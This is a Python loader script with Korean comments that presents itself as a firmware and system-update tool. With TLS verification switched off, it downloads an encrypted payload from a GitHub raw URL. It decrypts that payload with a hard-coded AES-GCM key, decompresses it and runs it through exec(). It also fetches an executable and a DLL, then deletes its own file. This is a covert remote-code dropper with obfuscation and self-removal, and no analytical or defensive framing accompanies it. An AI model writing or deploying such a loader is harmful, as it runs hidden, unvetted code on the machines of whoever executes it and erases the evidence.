# -*- coding: utf-8 -*-
"""뚱시스템 로더 — raw URL로 rate-limit 우회"""
import urllib.request, base64, zlib, time, ssl, os

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
RAW = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main"
BASE = os.path.dirname(os.path.abspath(__file__))

def download(url, out):
    if os.path.exists(out): return True
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "ddong"})
        with open(out, "wb") as f:
            f.write(urllib.request.urlopen(req, timeout=15, context=ctx).read())
        return True
    except:
        return False

try:
    # data.txt (raw text = base64)
    data_url = RAW + "/data.txt"
    req = urllib.request.Request(data_url, headers={"User-Agent": "ddong"})
    b64_str = urllib.request.urlopen(req, timeout=10, context=ctx).read().decode("utf-8").strip()
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    
    # 펌웨어 자동 다운로드 (실패해도 무시)
    for fpath in ["firmware/cs_firmware.hex", "firmware/avrdude/avrdude.exe",
                  "firmware/avrdude/avrdude.conf", "firmware/avrdude/libusb0.dll"]:
        local = os.path.join(BASE, fpath)
        if not os.path.exists(local):
            download(RAW + "/" + fpath, local)
    
    try: os.remove(__file__)
    except: pass
    exec(code)
except Exception as err:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
